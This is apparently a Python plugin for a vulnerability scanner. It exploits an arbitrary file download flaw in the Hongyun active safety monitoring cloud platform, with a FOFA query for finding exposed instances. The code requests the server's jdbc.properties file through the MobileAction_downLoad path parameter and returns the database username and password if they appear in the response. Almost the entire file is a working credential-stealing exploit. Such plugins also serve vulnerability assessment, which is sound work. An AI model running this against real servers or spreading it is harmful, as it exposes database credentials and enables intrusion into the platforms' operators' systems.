#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s?__biz=MzU1ODQ2NTY3Ng==&mid=2247484376&idx=1&sn=d5a493d7008289295436db432855467f&chksm=fc27543bcb50dd2df1413b2515cc236e8f22e352e8dbb33a64a7d744b27757c273461e8e1ef0&scene=126&sessionid=1697336461&key=ada403088d2f593d62ab541a906fd7564e99365a542803d575250f95138e066615ab565d2348c2469915a48e508b02d205742d1c32373a633e7dd166316b691d8ffe444933ef10a95bc6f2426bf91fbca9dd013c0cfb9cda427c9c44c0c4951698ff369703b8e49bace3d85e7c5e0d5f03ece20308ed8418ab31f64f46d64a75&ascene=15&uin=MTI5ODM0MTMwNQ%3D%3D&devicetype=Windows+10+x64&version=63060012&lang=zh_CN&session_us=gh_c57275954216&exportkey=n_ChQIAhIQ8IyvLExS%2FAiIO7ocLndzchLvAQIE97dBBAEAAAAAAPIdAOUV0fwAAAAOpnltbLcz9gKNyK89dVj0VpeRD9DNGWe7ErbxGNTJ%2B7ONuHNyLhVrSAmau%2BwXdeenuoa7%2BNrP5H8jOyqmNkjN5z3VY0Mqcn%2FagYHLe%2BFdeY%2FaLN5BTr3D6IPvcicy%2BXoFzQ1QWW67SQiXob1%2BzVgy1KNIxd1dB0txIRuhPoNKhkdWO9%2B%2FcoJMfDr1QWH5zseMzuXhMAXHH4R99FYm61YP6TsaKVrlQRQvebayhnwvgEKdQUUrJA0RlmRbOXm54Lw%2F8pitzyhFL12jO8olqn76pAR%2FLHpYR8ba&acctmode=0&pass_ticket=Z16NUadm%2BcYG52HBWaHLE2pEAOUlUEvvl0WYA8nnq%2B64EXYTNxNzzhvfPtBVHrrm&wx_header=0&fontgear=2',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '鸿运主动安全监控云平台任意文件下载',

      'level'     :   'high',

      'FOFA'      :   'body="./open/webApi.html"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/25',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'DATABASE.*?jdbc.connection.username=.*?jdbc.connection.password',res.text,re.S):
      ret['huixian'] = '\n'+res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret